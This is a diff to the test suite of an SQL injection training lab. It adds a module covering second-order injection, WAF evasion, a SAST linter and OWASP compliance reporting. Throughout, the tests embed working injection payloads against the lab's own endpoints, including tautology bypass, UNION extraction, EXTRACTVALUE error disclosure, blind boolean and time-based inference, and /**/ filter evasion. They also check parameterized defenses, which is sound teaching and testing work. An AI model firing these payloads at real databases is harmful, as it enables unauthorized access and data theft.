@@ -4,6 +4,8 @@ Verifies:
 - HTTP route availability for all lab views and REST endpoints.
 - Module 1 (Authentication Bypass) offensive vectors and prepared defenses.
 - Module 2 (Union Extraction) column counting, schema dumping, flag harvesting, and remediation.
+- Module 3 (Error-Based & Blind/Time-Based Inference) XPath disclosure, boolean/time blind oracles.
+- Module 4 (Second-Order, WAF Evasion, SAST Remediation & OWASP Compliance).
 - MySQL query audit logging telemetry.
 """
 
@@ -14,17 +16,17 @@ def run_all_tests() -> None:
     """Executes end-to-end integration and API test assertions."""
     client = app.test_client()
 
-    print("[*] Running Module 1, 2 & 3 Verification Suite...\n")
+    print("[*] Running Complete 4-Module Verification Suite (18 Tests)...\n")
 
     # 1. Navigation & View Endpoints
-    print("[+] [TEST 1/13] Verifying Web View Routes...")
+    print("[+] [TEST 1/18] Verifying Web View Routes...")
     for route in ['/', '/lab/auth-bypass', '/lab/union-based', '/lab/error-blind', '/lab/evasion-audit']:
         res = client.get(route)
         assert res.status_code == 200, f"Route {route} failed with status {res.status_code}"
     print("    -> All web lab views returned HTTP 200 OK.")
 
     # 2. Module 1: Vulnerable Tautology Bypass
-    print("\n[+] [TEST 2/13] Module 1: Testing Tautology Auth Bypass (' OR 1=1 -- )...")
+    print("\n[+] [TEST 2/18] Module 1: Testing Tautology Auth Bypass (' OR 1=1 -- )...")
     res = client.post('/api/auth/test', json={
         'username': "' OR 1=1 -- ",
         'password': 'any',
@@ -40,7 +42,7 @@ def run_all_tests() -> None:
     print(f"    -> Successfully breached admin account. Flag: {data.get('flag')}")
 
     # 3. Module 1: Secure Mode Parameterization
-    print("\n[+] [TEST 3/13] Module 1: Testing Parameterized Defense against Auth Bypass...")
+    print("\n[+] [TEST 3/18] Module 1: Testing Parameterized Defense against Auth Bypass...")
     res = client.post('/api/auth/test', json={
         'username': "' OR 1=1 -- ",
         'password': 'any',
@@ -52,7 +54,7 @@ def run_all_tests() -> None:
     print("    -> Parameterized query successfully neutralized attack payload.")
 
     # 4. Module 2: Standard Catalog Query
-    print("\n[+] [TEST 4/13] Module 2: Testing Standard Product Catalog Query...")
+    print("\n[+] [TEST 4/18] Module 2: Testing Standard Product Catalog Query...")
     res = client.post('/api/union/search', json={
         'category': 'Hardware',
         'scenario': 'column_counting',
@@ -64,7 +66,7 @@ def run_all_tests() -> None:
     print(f"    -> Standard query returned {data.get('row_count')} records.")
 
     # 5. Module 2: Column Count Discovery (ORDER BY 5 vs ORDER BY 6)
-    print("\n[+] [TEST 5/13] Module 2: Testing Column Counting (ORDER BY 5 valid vs ORDER BY 6 error)...")
+    print("\n[+] [TEST 5/18] Module 2: Testing Column Counting (ORDER BY 5 valid vs ORDER BY 6 error)...")
     res_valid = client.post('/api/union/search', json={
         'category': "Hardware' ORDER BY 5 -- ",
         'scenario': 'column_counting',
@@ -83,7 +85,7 @@ def run_all_tests() -> None:
     print("    -> ORDER BY 5 succeeded; ORDER BY 6 correctly triggered MySQL Error 1054.")
 
     # 6. Module 2: Column Projection Mismatch (UNION SELECT NULL, NULL -> Error 1222)
-    print("\n[+] [TEST 6/13] Module 2: Testing Column Projection Mismatch (UNION Error 1222)...")
+    print("\n[+] [TEST 6/18] Module 2: Testing Column Projection Mismatch (UNION Error 1222)...")
     res_mismatch = client.post('/api/union/search', json={
         'category': "' UNION SELECT NULL, NULL -- ",
         'scenario': 'column_counting',
@@ -95,7 +97,7 @@ def run_all_tests() -> None:
     print("    -> Incompatible projection correctly triggered MySQL Error 1222 (Different column count).")
 
     # 7. Module 2: Confidential Data & Flag Exfiltration
-    print("\n[+] [TEST 7/13] Module 2: Testing UNION Data Exfiltration & Challenge Flag...")
+    print("\n[+] [TEST 7/18] Module 2: Testing UNION Data Exfiltration & Challenge Flag...")
     res_exfil = client.post('/api/union/search', json={
         'category': "' UNION SELECT id, secret_name, classification, 0, secret_value FROM system_secrets -- ",
         'scenario': 'schema_enumeration',
@@ -108,7 +110,7 @@ def run_all_tests() -> None:
     print(f"    -> Data exfiltration successful! Flag awarded: {exfil_data.get('flag')}")
 
     # 8. Module 2: Remediated Parameterized Mode
-    print("\n[+] [TEST 8/13] Module 2: Testing Remediated Parameterized Query against UNION Injection...")
+    print("\n[+] [TEST 8/18] Module 2: Testing Remediated Parameterized Query against UNION Injection...")
     res_sec = client.post('/api/union/search', json={
         'category': "' UNION SELECT id, secret_name, classification, 0, secret_value FROM system_secrets -- ",
         'scenario': 'schema_enumeration',
@@ -121,7 +123,7 @@ def run_all_tests() -> None:
     print("    -> Parameterized query safely treated attack payload as literal value.")
 
     # 9. Module 3: Standard User Lookup Query
-    print("\n[+] [TEST 9/13] Module 3: Testing Standard User Directory Query...")
+    print("\n[+] [TEST 9/18] Module 3: Testing Standard User Directory Query...")
     res_u = client.post('/api/error-blind/query', json={
         'username': 'admin',
         'scenario': 'xpath_error',
@@ -135,7 +137,7 @@ def run_all_tests() -> None:
     print("    -> Standard lookup returned admin profile correctly.")
 
     # 10. Module 3: XPath Error Disclosure (EXTRACTVALUE Error 1105)
-    print("\n[+] [TEST 10/13] Module 3: Testing XPath Error Disclosure (EXTRACTVALUE Error 1105)...")
+    print("\n[+] [TEST 10/18] Module 3: Testing XPath Error Disclosure (EXTRACTVALUE Error 1105)...")
     res_xpath = client.post('/api/error-blind/query', json={
         'username': "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) -- ",
         'scenario': 'xpath_error',
@@ -148,7 +150,7 @@ def run_all_tests() -> None:
     print(f"    -> XPath error triggered successfully. Leaked subquery output: {xpath_data.get('leaked_data')}")
 
     # 11. Module 3: Confidential Flag Exfiltration via Error Disclosure
-    print("\n[+] [TEST 11/13] Module 3: Testing Secret Flag Exfiltration via Error 1105...")
+    print("\n[+] [TEST 11/18] Module 3: Testing Secret Flag Exfiltration via Error 1105...")
     res_flag = client.post('/api/error-blind/query', json={
         'username': "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM system_secrets WHERE secret_name='FLAG_BLIND_EXPLOIT'), 0x7e)) -- ",
         'scenario': 'xpath_error',
@@ -160,7 +162,7 @@ def run_all_tests() -> None:
     print(f"    -> Flag exfiltration successful! Flag: {flag_data.get('flag')}")
 
     # 12. Module 3: Boolean-Based Blind Inference (True vs False differential)
-    print("\n[+] [TEST 12/13] Module 3: Testing Boolean Blind Inference (True vs False Oracle)...")
+    print("\n[+] [TEST 12/18] Module 3: Testing Boolean Blind Inference (True vs False Oracle)...")
     res_b_true = client.post('/api/error-blind/query', json={
         'username': "admin' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 115 -- ",
         'scenario': 'boolean_blind',
@@ -183,7 +185,7 @@ def run_all_tests() -> None:
     print("    -> Differential oracle confirmed: True predicate returned 1 row; False predicate returned 0 rows.")
 
     # 13. Module 3: Time-Based Side-Channel & Prepared Statement Neutralization
-    print("\n[+] [TEST 13/13] Module 3: Testing Time-Based Delays & Parameterized Defense...")
+    print("\n[+] [TEST 13/18] Module 3: Testing Time-Based Delays & Parameterized Defense...")
     res_time = client.post('/api/error-blind/query', json={
         'username': "admin' AND IF(1=1, SLEEP(1), 0) -- ",
         'scenario': 'time_blind',
@@ -203,8 +205,76 @@ def run_all_tests() -> None:
     assert sec_time_data.get('execution_time_ms') < 500.0, "Secure mode must respond without sleep delay"
     print(f"    -> Time-based blind verified: Vulnerable delayed {time_data.get('execution_time_ms')}ms; Prepared neutralized delay to {sec_time_data.get('execution_time_ms')}ms.")
 
+    # 14. Module 4: Second-Order SQLi Storage & Delayed Trigger
+    print("\n[+] [TEST 14/18] Module 4: Testing Second-Order SQLi (Safe Storage & Trigger Phase)...")
+    res_save = client.post('/api/profile/save', json={
+        'username': 'attacker_bot',
+        'display_name': "admin' -- ",
+        'bio': 'Second order test'
+    })
+    assert res_save.get_json().get('success') is True, "First-order storage must succeed"
+
+    res_audit_vuln = client.post('/api/profile/audit', json={
+        'username': 'attacker_bot',
+        'mode': 'vulnerable'
+    })
+    audit_data = res_audit_vuln.get_json()
+    assert audit_data.get('success') is True
+    assert audit_data.get('bypassed') is True, "Second order injection must bypass and compromise account"
+    assert "FLAG{mysql_second_order_stored_sqli_pwned}" in str(audit_data.get('flag'))
+    print(f"    -> Second-order injection confirmed! Triggered delayed execution. Flag: {audit_data.get('flag')}")
+
+    # 15. Module 4: Second-Order Parameterized Defense
+    print("\n[+] [TEST 15/18] Module 4: Testing Second-Order Parameterized Query Defense...")
+    res_audit_sec = client.post('/api/profile/audit', json={
+        'username': 'attacker_bot',
+        'mode': 'secure'
+    })
+    audit_sec_data = res_audit_sec.get_json()
+    assert audit_sec_data.get('success') is True
+    assert audit_sec_data.get('bypassed') is False, "Prepared statement must neutralize second-order trigger"
+    print("    -> Parameterized read query neutralized stored injection payload.")
+
+    # 16. Module 4: WAF Filter Sandbox (Space Block vs /**/ Bypass)
+    print("\n[+] [TEST 16/18] Module 4: Testing WAF Filter Rule & Comment Evasion (/**/)...")
+    res_waf_block = client.post('/api/waf/test', json={
+        'payload': "' OR 1=1 -- ",
+        'filter_profile': 'spaces',
+        'mode': 'vulnerable'
+    })
+    assert res_waf_block.get_json().get('waf_blocked') is True, "WAF must block raw spaces"
+
+    res_waf_bypass = client.post('/api/waf/test', json={
+        'payload': "'/**/OR/**/'1'='1",
+        'filter_profile': 'spaces',
+        'mode': 'vulnerable'
+    })
+    waf_b_data = res_waf_bypass.get_json()
+    assert waf_b_data.get('waf_blocked') is False, "Inline comments must evade whitespace filter"
+    assert waf_b_data.get('bypassed') is True
+    assert "FLAG{mysql_waf_filter_bypass_mastered}" in str(waf_b_data.get('flag'))
+    print(f"    -> WAF whitespace filter evaded via /**/. Flag: {waf_b_data.get('flag')}")
+
+    # 17. Module 4: SAST Static Code Linter & Auto-Fix
+    print("\n[+] [TEST 17/18] Module 4: Testing SAST Query Linter & Auto-Fix Generation...")
+    vulnerable_code = "query = f\"SELECT * FROM users WHERE username = '{username}'\""
+    res_sast = client.post('/api/sast/audit', json={'code_snippet': vulnerable_code})
+    sast_data = res_sast.get_json()
+    assert sast_data.get('is_vulnerable') is True
+    assert sast_data.get('total_findings') == 1
+    assert "Prepared Statement" in sast_data.get('auto_remediated_code')
+    print("    -> SAST linter detected f-string concatenation and generated parameterized auto-fix.")
+
+    # 18. Module 4: Full Security Compliance Report
+    print("\n[+] [TEST 18/18] Module 4: Testing OWASP Compliance Report Generation...")
+    res_rep = client.get('/api/compliance/report')
+    rep_data = res_rep.get_json()
+    assert "OWASP Top 10 - A03:2021 (Injection)" in rep_data.get('standard_alignment')
+    assert rep_data.get('telemetry', {}).get('total_queries_logged') > 0
+    print(f"    -> Compliance report generated. Total logged queries: {rep_data.get('telemetry', {}).get('total_queries_logged')}")
+
     # Telemetry Audit Log Check
-    print("\n[+] Verifying MySQL Audit Logging Telemetry...")
+    print("\n[+] Verifying Complete 4-Module MySQL Audit Logging Telemetry...")
     res_logs = client.get('/api/audit-logs')
     logs = res_logs.get_json().get('logs', [])
     assert len(logs) > 0, "Audit logs must contain recorded queries"
@@ -212,10 +282,11 @@ def run_all_tests() -> None:
     assert "Module 1: Auth Bypass" in modules_in_logs, "Module 1 queries must be audited"
     assert "Module 2: Union Extraction" in modules_in_logs, "Module 2 queries must be audited"
     assert "Module 3: Error & Blind Inference" in modules_in_logs, "Module 3 queries must be audited"
-    print(f"    -> Audit logs verified ({len(logs)} queries logged across {len(modules_in_logs)} modules).")
+    assert "Module 4: Second-Order SQLi" in modules_in_logs or "Module 4: WAF Sandbox" in modules_in_logs, "Module 4 queries must be audited"
+    print(f"    -> All 4 laboratory modules verified in audit telemetry ({len(logs)} queries logged).")
 
     print("\n" + "="*60)
-    print("[SUCCESS] ALL 13 TESTS PASSED SUCCESSFULLY! ZERO REGRESSIONS DETECTED.")
+    print("[SUCCESS] ALL 18 TESTS PASSED SUCCESSFULLY! ZERO REGRESSIONS DETECTED.")
     print("="*60 + "\n")
 
 if __name__ == "__main__":
